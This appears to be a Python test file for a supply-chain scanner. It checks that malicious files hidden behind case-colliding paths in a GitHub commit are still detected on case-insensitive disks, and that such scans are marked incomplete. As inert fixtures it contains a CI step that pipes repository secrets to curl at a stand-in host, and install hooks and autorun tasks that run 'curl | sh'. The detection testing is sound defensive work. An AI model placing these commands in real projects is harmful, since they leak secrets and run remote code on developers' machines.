"""Paths of a commit that a disk holds as one name, end to end (MAC-TESTS):
`lazaret scan github:…` (sourcescan) and the registry's repository scan
(ghdiscover) find what is in each of them, at its path in the commit, on
this machine's disk and on one that ignores case and Unicode form as macOS's
and Windows' do (`tests/_folding_disk.py`), and on such a disk say that the
commit was not read whole.

Before, the second of two such paths was kept under another name or not at
all, and what was in it was not found: a workflow beside a `.GITHUB` file, a
package.json beside a Package.json, a `lib/` beside a `Lib/` (see each case:
where it was lost). A path the disk refuses is written whole in a twin tree
beside the checkout (`sources._Writer`), which is given the commit's other
files it can hold and scanned as the commit's own (`core.scan_twins`), so
what a rule reads across files is found too (a task's script, a hook's, the
helper a tainted call goes into). Two paths that are one name there are
never in one tree, so such a scan is INCOMPLETE (SUSPICIOUS where a strong
indicator is found), never OK. The payloads are inert text that the rules
match; the network seam is a fake and nothing is fetched.
"""

import io
import json
import os
import shutil
import tempfile
import unittest
from contextlib import nullcontext, redirect_stderr, redirect_stdout
from unittest import mock

from lazaret.registry import ghdiscover, sources, sourcescan
from lazaret.scanner import engine
from tests._folding_disk import apfs_fold, folding_disk, tells_names_apart
from tests.registry.test_sources import Net, gh_answers

SPEC = "github:o/r@v1"
REPORT = "lazaret-github-o-r-0123456-report.json"

PY_SINK = b"import os\nos.system(input())\n"
PY_PLAIN = b"x = 1\n"
WORKFLOW = (b"on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
            b"      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n")
TASKS = (b'{"version": "2.0.0", "tasks": [{"label": "x", "type": "shell", "command": "curl https://x.invalid/s | sh", '
         b'"runOptions": {"runOn": "folderOpen"}}]}')
HOOK = b'{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "curl https://x.invalid/x | sh"}}'
PLAIN = b'{"name": "x", "version": "1.0.0"}'
NODE_HOOK = b'{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}'
PAYJS = b"const cp = require('child_process');\ncp.exec('curl https://x.invalid/s | sh');\n"
PIPE_SH = b"curl https://x.invalid/s | sh\n"
RUN_TASKS = (b'{"version": "2.0.0", "tasks": [{"label": "x", "type": "shell", "command": "sh run.sh", '
             b'"runOptions": {"runOn": "folderOpen"}}]}')

#: a commit's files, and what the scan must find in them at their paths in the commit; the comment says where the
#: finding was lost before MAC-TESTS (the second twin was written as `<path>.lazaret-dup1` on every disk)
CASES = {
    # either disk: app.py was written as app.py.lazaret-dup1, which no rule reads as Python
    "a Python sink in the second of two files": (
        {"App.py": PY_PLAIN, "app.py": PY_SINK}, {("S-OSCMD-PY", "app.py")}),
    # either disk: lib/A.py.lazaret-dup1
    "a Python sink in a folder beside its twin folder": (
        {"Lib/a.py": PY_PLAIN, "lib/A.py": PY_SINK}, {("S-OSCMD-PY", "lib/A.py")}),
    # either disk: package.json.lazaret-dup1, no manifest
    "an install hook in the second package.json": (
        {"Package.json": PLAIN, "package.json": HOOK}, {("SC-INSTALL-HOOK", "package.json")}),
    # the folding disk: lib/ could not be made beside the file; no report (export-ignore, nothing else to scan)
    "an install hook in a folder beside a file of its name": (
        {"Lib": b"notes\n", "lib/package.json": HOOK}, {("SC-INSTALL-HOOK", "lib/package.json")}),
    # the folding disk: no report, as above
    "workflow secrets beside a .GITHUB file": (
        {".GITHUB": b"notes\n", ".github/workflows/ci.yml": WORKFLOW},
        {("SC-WORKFLOW-SECRETS", ".github/workflows/ci.yml")}),
    # the folding disk: no report, as above
    "workflow secrets beside a WORKFLOWS file": (
        {".github/WORKFLOWS": b"notes\n", ".github/workflows/ci.yml": WORKFLOW},
        {("SC-WORKFLOW-SECRETS", ".github/workflows/ci.yml")}),
    # the folding disk: merged into .GitHub/, and reported at .GitHub/workflows/ci.yml, no path of the commit
    "workflow secrets in a folder beside its twin folder": (
        {".GitHub/README": b"notes\n", ".github/workflows/ci.yml": WORKFLOW},
        {("SC-WORKFLOW-SECRETS", ".github/workflows/ci.yml")}),
    # the folding disk: no report, as above
    "an autorun task beside a .VSCODE file": (
        {".VSCODE": b"notes\n", ".vscode/tasks.json": TASKS}, {("SC-AUTORUN", ".vscode/tasks.json")}),
    # what a rule reads across files (the independent review of the first version of this, which read a twin tree
    # alone): the commit before found these on the folding disk only where it merged the trees or said INCOMPLETE
    "an autorun task running a script beside it": (
        {".VSCODE": b"notes\n", ".vscode/tasks.json": RUN_TASKS, "run.sh": PIPE_SH},
        {("SC-AUTORUN", ".vscode/tasks.json")}),
    "a tainted call into a helper of the root, from a twin folder": (
        {"Lib/x.js": b"// x\n", "lib/run.js": b"const h = require('../util/h');\nh.go(process.argv[2]);\n",
         "util/h.js": b"const cp = require('child_process');\nexports.go = (c) => cp.exec(c);\n"},
        {("X-CMD", "lib/run.js")}),
    "a twin package.json whose hook runs a script of the root": (
        {"Package.json": PLAIN, "install.js": PAYJS, "package.json": NODE_HOOK}, {("SC-INSTALL-HOOK", "package.json")}),
    "the root's package.json whose hook runs a twin script": (
        {"Install.js": b"// notes\n", "install.js": PAYJS, "package.json": NODE_HOOK},
        {("SC-INSTALL-HOOK", "package.json")}),
    "a twin setup.py calling a helper of the root with its arguments": (
        {"Setup.py": PY_PLAIN, "helper.py": b"import os\ndef run(c):\n    os.system(c)\n",
         "setup.py": b"import sys\nfrom helper import run\nrun(sys.argv[1])\n"}, {("X-CMD", "setup.py")}),
}

DISKS = {"this machine's disk": None, "a disk that ignores case and form": apfs_fold}


@unittest.skipUnless(engine.available(), "the scan needs the native engine")
class FoundAtTheirPaths(unittest.TestCase):
    def setUp(self):
        self.cwd = os.getcwd()
        self.tmp = os.path.realpath(tempfile.mkdtemp(prefix="lazaret-twins-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        os.chdir(self.tmp)
        self.addCleanup(os.chdir, self.cwd)
        self.apart = tells_names_apart(self.tmp)        # (this machine's disk: Linux's tell the names apart)

    def disk(self, fold):
        """The temporary folder the checkouts go to, on a disk that folds names as `fold` does (none: this one's);
        the twin trees are made beside a checkout, in it too."""
        disk = tempfile.mkdtemp(dir=self.tmp)
        return disk, mock.patch.object(tempfile, "tempdir", disk), (folding_disk(disk, fold) if fold else nullcontext())

    def scan_cli(self, files, fold, *opts):
        disk, temp, on = self.disk(fold)
        out, err = io.StringIO(), io.StringIO()
        with temp, on, redirect_stdout(out), redirect_stderr(err):
            code = sourcescan.main([SPEC, "--ci", "-q", *opts], env={}, http=Net(gh_answers(files=files)))
        with open(REPORT, encoding="utf-8") as f:
            report = json.load(f)
        os.remove(REPORT)
        self.assertEqual(os.listdir(disk), [])                      # (the checkout and its twin trees are gone)
        return code, report, out.getvalue() + err.getvalue()

    def scan_registry(self, files, fold):
        disk, temp, on = self.disk(fold)
        with temp, on:
            res, _calls = ghdiscover.scan_repository("o/r", "v1", env={}, http=Net(gh_answers(files=files)))
        self.assertEqual(os.listdir(disk), [])
        return res

    @staticmethod
    def found(issues):
        return {(i["rule"], i["sev"], i["file"], i["line"]) for i in issues}

    def check(self, name):
        """Each disk: what `want` names is found at its path, and nothing at a path the commit does not have. On a
        disk that holds two paths as one: not read whole (the CLI's --ci fails on it, the registry says INCOMPLETE,
        or SUSPICIOUS where this disk's scan is), and nothing this machine's disk finds is missed."""
        files, want = CASES[name]
        got = {}
        for disk, fold in DISKS.items():
            with self.subTest(disk=disk):
                code, report, said = self.scan_cli(files, fold)
                res = self.scan_registry(files, fold)
                cli, reg = self.found(report["issues"]), self.found(res["issues"])
                self.assertLessEqual(want, {(r, f) for r, _, f, _ in cli}, said)
                self.assertLessEqual(want, {(r, f) for r, _, f, _ in reg}, res["verdictReason"])
                # every finding at a path of the commit: none at a twin tree's, none at a merged folder's
                self.assertLessEqual({f for _, _, f, _ in cli | reg}, set(files))
                self.assertEqual(code, 1, said)                     # the finding fails the gate
                got[disk] = cli, reg, res["verdict"], report["metrics"]
                if fold is None and self.apart:
                    self.assertTrue(report["source"]["complete"], report["source"])
                    self.assertNotIn("incomplete", report)
                else:
                    self.assertFalse(report["source"]["complete"])
                    self.assertTrue(report["incomplete"])
                    self.assertEqual([g[0] for g in report["source"]["incomplete"]], ["case"])
                    self.assertIn(res["verdict"], ("SUSPICIOUS", "INCOMPLETE"))
        if self.apart:                                  # (on a Mac both disks are the folding kind)
            (cli, reg, verdict, metrics), (cli_folded, reg_folded, verdict_folded, metrics_folded) = got.values()
            self.assertLessEqual(cli, cli_folded)
            self.assertLessEqual(reg, reg_folded)
            self.assertEqual(verdict_folded, "SUSPICIOUS" if verdict == "SUSPICIOUS" else "INCOMPLETE")
            # (the twin trees' own files are counted with the root's, each once)
            self.assertEqual(metrics_folded, metrics)

    def test_a_python_sink_in_the_second_of_two_files(self):
        self.check("a Python sink in the second of two files")

    def test_a_python_sink_in_a_folder_beside_its_twin_folder(self):
        self.check("a Python sink in a folder beside its twin folder")

    def test_an_install_hook_in_the_second_package_json(self):
        self.check("an install hook in the second package.json")

    def test_an_install_hook_in_a_folder_beside_a_file_of_its_name(self):
        self.check("an install hook in a folder beside a file of its name")

    def test_workflow_secrets_beside_a_github_file(self):
        self.check("workflow secrets beside a .GITHUB file")

    def test_workflow_secrets_beside_a_workflows_file(self):
        self.check("workflow secrets beside a WORKFLOWS file")

    def test_workflow_secrets_in_a_folder_beside_its_twin_folder(self):
        self.check("workflow secrets in a folder beside its twin folder")

    def test_an_autorun_task_beside_a_vscode_file(self):
        self.check("an autorun task beside a .VSCODE file")

    def test_an_autorun_task_running_a_script_beside_it(self):
        self.check("an autorun task running a script beside it")

    def test_a_tainted_call_into_a_helper_of_the_root_from_a_twin_folder(self):
        self.check("a tainted call into a helper of the root, from a twin folder")

    def test_a_twin_package_json_whose_hook_runs_a_script_of_the_root(self):
        self.check("a twin package.json whose hook runs a script of the root")

    def test_the_root_s_package_json_whose_hook_runs_a_twin_script(self):
        self.check("the root's package.json whose hook runs a twin script")

    def test_a_twin_setup_py_calling_a_helper_of_the_root(self):
        self.check("a twin setup.py calling a helper of the root with its arguments")

    def test_twins_with_nothing_to_find_are_incomplete_on_such_a_disk(self):
        # (what a Mac's scan of such a commit now says: two of its paths were never side by side there)
        files = {"README.md": b"# a\n", "Readme.md": b"# b\n", "index.js": b"module.exports = 1;\n"}
        if self.apart:
            code, report, said = self.scan_cli(files, None)
            self.assertEqual((code, report["source"]["complete"]), (0, True), said)
            self.assertEqual(self.scan_registry(files, None)["verdict"], "OK")
            self.assertEqual(self.scan_registry({"README.md": b"# a\n", "Readme.md": b"# b\n"}, None)["verdict"], "OK")
        code, report, said = self.scan_cli(files, apfs_fold)
        self.assertEqual((code, report["issues"]), (1, []), said)      # (--ci: not read whole)
        self.assertIn("case: 1 path(s) were kept apart from the commit's other files on this disk", said)
        self.assertIn("so rules across files may not have seen them together: Readme.md", said)
        code, report, said = self.scan_cli(files, apfs_fold, "--accept-incomplete")
        self.assertEqual((code, report["incomplete"]), (0, True), said)
        for repo in (files, {"README.md": b"# a\n", "Readme.md": b"# b\n"}):     # (with no code at all too)
            res = self.scan_registry(repo, apfs_fold)
            self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])
            self.assertIn("Readme.md", res["verdictReason"])

    def test_past_the_overlay_s_limit_the_twin_trees_are_read_alone_and_it_is_incomplete(self):
        files, _want = CASES["a tainted call into a helper of the root, from a twin folder"]
        with mock.patch.object(sources, "MAX_OVERLAY_FILES", 0):
            code, report, said = self.scan_cli(files, apfs_fold)
            res = self.scan_registry(files, apfs_fold)
        self.assertEqual(code, 1, said)
        self.assertTrue(report["incomplete"])
        self.assertTrue(any("were not given the commit's other files" in n for n in report["source"]["notes"]))
        self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])


class MergeFindings(unittest.TestCase):
    """core.merge_findings: one commit's findings from two trees (the root and a twin tree given the root's other
    files), each once, at the most severe."""

    def issue(self, rule, file, line, sev, msg="m"):
        return {"rule": rule, "file": file, "line": line, "sev": sev, "msg": msg}

    def test_the_most_severe_of_a_place_once(self):
        from lazaret.scanner import core
        root = [self.issue("X-CMD", "a.py", 3, "MAJOR", "root"), self.issue("S-EVAL-PY", "b.py", 1, "CRITICAL"),
                self.issue("S-SECRET", "c.env", 2, "CRITICAL", "one"), self.issue("S-SECRET", "c.env", 2, "CRITICAL",
                                                                                  "two")]
        twin = [self.issue("X-CMD", "a.py", 3, "CRITICAL", "twin"),          # (more beside it: more severe)
                self.issue("S-EVAL-PY", "b.py", 1, "CRITICAL", "again"),     # (the root's again: once)
                self.issue("S-SECRET", "c.env", 2, "MAJOR"),                 # (less severe: the root's stay, both)
                self.issue("X-CMD", "lib/a.py", 3, "CRITICAL")]              # (its own)
        got = core.merge_findings(root, twin)
        self.assertEqual(sorted((i["file"], i["rule"], i["sev"], i["msg"]) for i in got), [
            ("a.py", "X-CMD", "CRITICAL", "twin"), ("b.py", "S-EVAL-PY", "CRITICAL", "m"),
            ("c.env", "S-SECRET", "CRITICAL", "one"), ("c.env", "S-SECRET", "CRITICAL", "two"),
            ("lib/a.py", "X-CMD", "CRITICAL", "m")])
        self.assertEqual(core.merge_findings([], twin[:1]), twin[:1])


if __name__ == "__main__":
    unittest.main()
